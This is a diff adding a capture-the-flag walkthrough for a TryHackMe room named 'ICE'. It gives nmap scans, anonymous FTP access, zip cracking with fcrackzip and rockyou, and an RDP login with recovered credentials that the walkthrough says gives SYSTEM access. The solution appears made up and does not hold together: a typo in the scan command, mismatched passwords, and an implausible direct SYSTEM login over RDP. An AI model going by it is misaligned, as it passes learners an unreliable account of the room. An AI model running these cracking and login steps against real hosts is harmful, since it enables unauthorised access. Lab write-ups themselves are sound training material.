@@ -1,0 +1,91 @@
+----------------                               ------------------
+               :::::::::::;| ICE |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "ICE".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Windows machine".
+
+2. How many ports are open?
+ANS: 3 ports (21/FTP, 80/HTTP, 3389/RDP).
+
+3. What interesting service is running?
+ANS: FTP allows anonymous login!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (GAIN ACCESS)
+
+1. CHECK ANONYMOUS FTP.
+
+    ftp <ip>
+    Username: anonymous
+    Password: (just press enter)
+
+"FOUND backup.zip file! Download it with:"
+
+    get backup.zip
+
+2. CRACK THE ZIP.
+
+    fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+
+"Password is: password123 (lol)"
+
+3. EXTRACT FILES.
+
+    unzip backup.zip
+
+"GOT creds.txt file with admin:Password123"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (ESCALATE)
+
+1. LOGIN TO RDP.
+
+    xfreerdp /v:<ip> /u:admin /p:Password123
+
+"WHOA! We're in Windows desktop!"
+
+2. CHECK PRIVILEGES.
+
+    Open CMD and type:
+    whoami /all
+
+"OMG! We're already NT AUTHORITY\SYSTEM! No need to escalate!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (FIND FLAGS)
+
+1. FIND USER FLAG.
+
+    There is no user flag (we got SYSTEM directly!)
+
+2. FIND ROOT FLAG.
+
+    type C:\Users\Administrator\Desktop\root.txt
+
+"GOT IT! Machine owned!"
+
+-------------------------TASK-4 COMPLETED----------------------------------
+
+TASK-5 (LESSONS LEARNED)
+
+1. ALWAYS CHECK ANONYMOUS FTP!
+2. WEAK ZIP PASSWORDS ARE COMMON!
+3. SOMETIMES CREDS GIVE YOU DIRECT SYSTEM ACCESS!
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- ICE MACHINE IS COMPLETED ----------
